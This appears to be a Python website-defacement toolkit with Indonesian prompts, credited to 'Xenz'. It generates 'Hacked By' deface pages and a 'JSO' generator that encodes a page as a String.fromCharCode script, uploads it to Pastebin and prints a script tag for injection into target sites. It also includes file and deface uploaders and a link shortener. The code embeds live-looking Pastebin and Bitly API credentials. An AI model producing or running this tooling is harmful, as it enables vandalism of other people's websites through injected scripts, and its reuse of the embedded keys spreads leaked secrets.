#>>>>>>>>>> Import Module <<<<<<<<<<<#
import os
import subprocess
import time
import random
import re
import json

for ngimport in range(10):
	try:
		import requests
		import bs4
		import rich
		import fake_useragent
	except ImportError as module_error:
		os.system('python -m pip install {} &> /dev/null'.format(module_error.name))

from rich.console import Console
from rich.panel import Panel
from rich.markdown import Markdown
from bs4 import BeautifulSoup
from time import sleep
from time import strftime
from fake_useragent import UserAgent

#>>>>>>>>>> Warna Warni <<<<<<<<<<<#
N,M,K,H,B,U,C,P = "\x1b[00m","\x1b[38;2;255;0;0m","\x1b[38;2;208;255;0m","\x1b[38;2;0;255;8m","\x1b[38;2;38;0;255m","\x1b[38;2;234;0;255m","\x1b[38;2;0;221;255m","\x1b[1;97m"
#>>>>>>>>>> Warna Rich <<<<<<<<<<<#
MM = '#ff0000'
HH = '#00ff08'
KK = '#d0ff00'
BB = '#2600ff'
CC = '#00ddff'
UU = '#ea00ff'
PP = '#ffffff'
panel_color = random.choice([MM,HH,KK,BB,CC,UU])


class Main:
	def __init__(self):
		_ = 'Hallo bang semoga sehat selalu:)'
		os.system('clear')
		self.banner = '''    {}▐▄• ▄ ▄▄▄ . ▐ ▄ ·▄▄▄▄•    {}▄▄▄▄▄            ▄▄▌  .▄▄ · 
    {} █▌█▌▪▀▄.▀·•█▌▐█▪▀·.█▌    {}•██  ▪     ▪     ██•  ▐█ ▀. 
    {} ·██· ▐▀▀▪▄▐█▐▐▌▄█▀▀▀•     {}▐█.▪ ▄█▀▄  ▄█▀▄ ██▪  ▄▀▀▀█▄
    {}▪▐█·█▌▐█▄▄▌██▐█▌█▌▪▄█▀     {}▐█▌·▐█▌.▐▌▐█▌.▐▌▐█▌▐▌▐█▄▪▐█
    {}•▀▀ ▀▀ ▀▀▀ ▀▀ █▪·▀▀▀ •     {}▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀  ▀▀▀▀ 
             {}[ {}CODED BY XENZ SANG PENGOCOK HANDAL {}]'''.format(M,U,M,U,M,U,M,U,M,U,P,H,P)
		print (self.banner)
		print ('''\n{} 1. {}Upload file {}({}anonfiles.com{})\n{} 2. {}Sc deface generator\n{} 3. {}Generator jso\n{} 4. {}Short link\n{} 5. {}Deface uploader'''.format(H,P,M,B,M,H,P,H,P,H,P,H,P))
		self.pilih = input('\n >•< Choose: ')
		if self.pilih == '1':self.Anonfiles()
		elif self.pilih == '2':self.Generator_sc()
		elif self.pilih == '3':self.Generator_jso()
		elif self.pilih == '4':self.Short_link()
		elif self.pilih == '5':self.Deface_Uploader()
		else:pass
	def Back(self):
		bck = input('\n{}       [ {}ENTER TO BACK {}]'.format(M,H,M))
		Main()
	def Anonfiles(self):
		Console().print(Markdown('# Anonfiles',style='blue'),width=60,style='plum4')
		file = input('{} Input Your Path/: {}'.format(P,H))
		try:open_file = open(file,'r').read()
		except FileNotFoundError as e:print (e);self.Back()
		except Exception:open_file = open(file,'rb').read()
		file_name = os.path.basename(file)
		try:
			req = requests.post('https://api.anonfiles.com/upload',files={'file':(file_name,open_file)})
			res = json.loads(req.text)
			full = res['data']['file']['url']['full']
			short = res['data']['file']['url']['short']
			name = res['data']['file']['metadata']['name']
			size = res['data']['file']['metadata']['size']['readable']

			print ('''{} Upload Success\n{} + {}Link       : {}{}\n{} + {}Short Link : {}{}\n{} + {}File Name  : {}{}\n{} + {}File Size  : {}{}'''.format(H,M,P,H,full,M,P,H,short,M,P,H,name,M,P,H,size))
		except Exception as e:print ('{} ! {}{}'.format(M,P,e))
		self.Back()

	def Generator_sc(self):
		Console().print(Markdown('# GENERATOR SC DEFACE',style='blue'),width=60,style='plum4')
		ngent = ' {}<{}*{}>{}'.format(M,H,M,P)
		hacked = input('{} Hacked By : {}'.format(ngent,H))
		link_lagu = input('{} Link lagu : {}'.format(ngent,H))
		link_logo = input('{} Link logo gambar : {}'.format(ngent,H))
		link_backgroud = input('{} Link gambar background : {}'.format(ngent,H))
		pesan = input('{} Masukan pesan gunakan <br> untuk ganti baris : {}'.format(ngent,H))
		team = input('{} Team : {}'.format(ngent,H))
		thanks = input('{} Thanks to : {}'.format(ngent,H))
		sc = f'''<!doctypehtml><title>Hacked By {hacked}</title><meta content="Hacked by {hacked}"name=title><meta content="index, follow"name=robots><meta content={hacked} name=author><meta content={link_logo} property=og:image><meta charset=UTF-8><meta content="Hacked By {hacked}"name=description><meta content="xenz, hacker, hacked by, uploader by, bjorka, html, shell, backdoor, programer, anonymous, touch by, heker"name=keywords><meta content="width=device-width,initial-scale=1"name=viewport><body bgcolor=black id=body onclick='document.getElementById("lagu").play(),fs()'oncontextmenu=return!1 onkeydown=return!1 onload=typeWriter() onmousedown=return!1 text=white><link href=https://cdn.prinsh.com/NathanPrinsley-textstyle/nprinsh-stext.css rel=stylesheet><script src=https://cdn.prinsh.com/NathanPrinsley-effect/efek-salju.js>'''
		sc += '''</script><style>marquee.xenz{position:fixed;width:100%;bottom:3px;font-family:Tahoma;height:15px;color:#fff;left:0;border-top:3px solid #8b0000;padding:2px;background-color:#000}#bg{position:fixed;top:0;left:0;z-index:-1;width:100%;height:100%}h2{margin-top:.4em;margin-bottom:.4em;color:#ff0d05}</style>'''
		sc += f'<body bgcolor=black><center><audio autoplay id=lagu loop src={link_lagu}></audio><img src={link_logo} width=260><div id=bg><img src={link_backgroud} width=600 alt=Background height=600></div><h1 class="nprinsleyy nprinsley-text-glitchan"style=font-size:25px><i>Hacked By {hacked}</i></h1><h2 class="nprinsleyy nprinsley-detaxt"style=font-size:15px>☠ {hacked} Was Here!! ☠</h2><font color=white face="Courier New"size=1>{pesan}<br><br><font color=white face="Courier New"size=2><b>Team: </b></font><font color=green face="Courier New"size=3><b>{team}</b></font><marquee class=xenz><b class=nathan-prinsley_none style=color:#750ac7;font-size:13px>Thanks to: {thanks}</b></marquee></center>'
		md = Markdown(f'''```html\n{sc}\n```''')
		Console().print(md)
		open('/sdcard/SC-DEFACE/{}.html'.format(hacked),'w').write(sc)
		print ('{} + {}Result saved in: {}/sdcard/SC-DEFACE/{}.html'.format(M,P,H,hacked))
		self.Back()

	def Generator_jso(self):
		Console().print(Markdown('# GENERATOR JSO',style='blue'),width=60,style='plum4')
		data = []
		cari = input('{} Input Your Path/: {}'.format(P,H))
		try:file = open(cari,'r').read()
		except Exception as e:print (e);self.Back()
		for jso in file:
			data.append(ord(jso))
		source = f'document.documentElement.innerHTML=String.fromCharCode{tuple(data)}'

		response = requests.post("https://pastebin.com/api/api_post.php", data={
		"api_dev_key": "8RdaEuqwlxXadjTj44oUAxwyOFIQaEeJ",
		"api_paste_code": source,
		"api_paste_private": "0",
		"api_paste_name": f"JSO-GENERATOR-BY-XENZ-{os.path.basename(cari).replace('.html','')}-{random.randint(100,999)}.txt",
		"api_paste_expire_date": "N",
		"api_option": "paste"
		})
		if response.status_code == requests.codes.ok:
			print(f'{H} + {P}Success: {H}<script type="text/javascript" src="https://pastebin.com/raw/{response.text.replace("https://pastebin.com/","")}"></script>')
		else:
			print(f"{H} + {P}Failed: {M}", response.text)
		self.Back()

	def Short_link(self):
		Console().print(Markdown('# SHORT LINK',style='blue'),width=60,style='plum4')
		url = input('{} • {}Input long url: {}'.format(M,P,H))
		try:
			response = requests.post('https://api-ssl.bitly.com/v4/shorten',data = json.dumps({'long_url': url}),headers = {'Authorization': f'Bearer 2c35b99be8e405ca4815bf07c5939470e46418fa','Content-Type': 'application/json',})
			response.raise_for_status()
			response_data = response.json()
			bitly = response_data['link']
		except:bitly='-'
		try:
			headers = {
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://www.shorturl.at',
			'referer': 'https://www.shorturl.at/',
			'Accept-Language': 'en-US,en;q=0.9'
			}
			request = requests.post("https://www.shorturl.at/shortener.php",data="u="+url,headers=headers)
			shorturl = request.text.split('id="shortenurl" type="text" value="')[1].split('"')[0]
		except:shorturl='-'
		print ('\n{} +{} bit.ly   : {}{}\n{} +{} shorturl : {}{}'.format(M,P,H,bitly,M,P,H,shorturl))
		self.Back()
	def Deface_Uploader(self):
		Console().print(Markdown('# DEFACE UPLOADER',style='blue'),width=60,style='plum4')
		cari = input('{} Input Your Path/: {}'.format(P,H))
		try:
			file = open(cari,'r').read()
			with requests.Session() as r:
				url = 'https://kosred.com/upload.php'
				headers = {'Authorization': 'Basic :'}
				req = r.post(url, files={'files[]':(cari,file)}, headers=headers).json()
				res = req['files']
				result = res[0]['url']
				print ('\n {} + {}Result: {}{}'.format(M, P, H, result))
				self.Back()
		except Exception as e:print (e);self.Back()


	def Next(self):
		print ('{} • {}Next update lah bang males ngoding gada penyemangat:")'.format(M,P))
		self.Back()

if __name__=='__main__':
	try:os.mkdir('/sdcard/SC-DEFACE/')
	except:pass
	Main()
